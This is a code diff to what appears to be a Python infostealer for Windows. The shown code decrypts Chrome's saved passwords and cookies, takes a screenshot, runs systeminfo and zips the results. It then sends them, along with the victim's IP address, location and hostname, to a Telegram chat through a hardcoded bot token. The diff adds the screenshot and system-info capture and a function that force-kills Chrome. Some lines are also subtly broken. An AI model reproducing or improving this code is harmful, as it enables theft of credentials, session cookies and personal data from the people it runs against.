@@ -11,6 +11,8 @@ import sqlite3
 from Cryptodome.Cipher import AES
 import win32crypt
 import shutil
+import sys
+import getpass
 import tempfile
 from PIL import ImageGrab
 
@@ -35,8 +37,30 @@ try:
 except:
     pass
 
+def screenshot():
+    try:
+        screenshot_path = os.path.join(path_data, "GrabFiles", "screenshot.png")
+        screenshot_first = ImageGrab.grab()
+        screenshot_first.save(screenshot_path)
+    except Exception as e:
+        print(f"Error taking or saving screenshot: {e}")
+
+    try:
+        system_info_path = os.path.join(path_data, "GrabFiles", "System_INFO.txt")
+        command = subprocess.check_output("systeminfo", stdout=subprocess.PIPE)
+        output = command.decode()
+        formatted_output = output.replace("\r\n", "\n")
+        with open(system_info_path, "w") as file:
+            file.write(formatted_output)
+
+    except Exception as e:
+        print(f"Error capturing or saving system info: {e}")
 
 
+def check_chrome_running():
+    for proc in os.popen("tasklist").readlines():
+        if "chrome.exe" in proc:
+            subprocess.run("taskkill /f /im chrome.exe", shell=True)
 
 
 def find_profile(data_path):
@@ -590,7 +614,7 @@ def extract():
                     secure = "FALSE"
                 value = decryptPassword(user[3], getSecretKey(row["pathkey"]))
                 cookie_data = (
-                    f"{user[0]}\t{httponly}\t{'/'}\t{secure}\t\t{user[1]}\t{value}{os.linesep}"
+                    f"{user[0]}\t{httponly}\t{'/'}\t{secure}\t\t{user[1]}\t{value}\n"
                 )
 
                 data1.append(cookie_data)
@@ -631,7 +655,7 @@ def extract():
                     password = decryptPassword(
                         userdatacombo[2], getSecretKey(row["pathkey"])
                     )
-                    data = f"-----------------------------------------------------------{os.linesep}URL: {userdatacombo[0]}{os.linesep}Username: {userdatacombo[1]}{os.linesep}Password: {password}"
+                    data = f"************************* *************************\nURL: {userdatacombo[0]}\nUsername: {userdatacombo[1]}\nPassword: {password}"
                     data2.append(data)
                     passwd += 1
 
@@ -642,7 +666,7 @@ def extract():
 
             with open(os.path.join(url_filepath), "w", encoding="utf-8") as f:
                 for line in data2:
-                    f.write(line + {os.linesep})
+                    f.write(line + "\n")
 
         except Exception as e:
             pass
@@ -670,6 +694,8 @@ async def main():
     ip, language = pcinfo()
     location, host, city, province, country = get_country(ip)
     name_file = os.getlogin()
+    screenshot()
+    # check_chrome_running()
     extract()
 
     current_time = datetime.now().strftime("%Hh%Mm%Ss-%d-%m-%Y")
@@ -678,7 +704,7 @@ async def main():
     shutil.make_archive(z_ph[:-4], "zip", path_data)
     TOKEN = "6761357605:AAFM2ncAfKU3BFJZK8_FzFI0LqokT05j5qQ"
     ID = "-4160958031"
-    body = f"<==== @asproozz01 ====>{os.linesep}⏰ Date => {datetime.now().strftime('%d/%m/%Y %H:%M')}{os.linesep}🔍 IP => {ip}{os.linesep}📡 Location => {location}{os.linesep}🛜 Hostname => {host}{os.linesep}🏴 Country => {country}{os.linesep}🏳‍🌈 Province => {province}{os.linesep}🚩 City => {city}{os.linesep}📝 Language => {language}{os.linesep}====[ Browsers Data ]===={os.linesep}🗝 Passwords => {passwd}{os.linesep}🍪 Cookies => {cookies}"
+    body = f"<====  ====>\n⏰ Date => {datetime.now().strftime('%d/%m/%Y %H:%M')}\n🔍 IP => {ip}\n📡 Location => {location}\n🛜 Hostname => {host}\n🏴 Country => {country}\n🏳‍🌈 Province => {province}\n🚩 City => {city}\n📝 Language => {language}\n====[ Browsers Data ]====\n🗝 Passwords => {passwd}\n🍪 Cookies => {cookies}"
     await sendfile(TOKEN, ID, z_ph, body)
     shutil.rmtree(os.environ["TEMP"], name_f + ".zip")
     shutil.rmtree(os.environ["TEMP"], name_f)
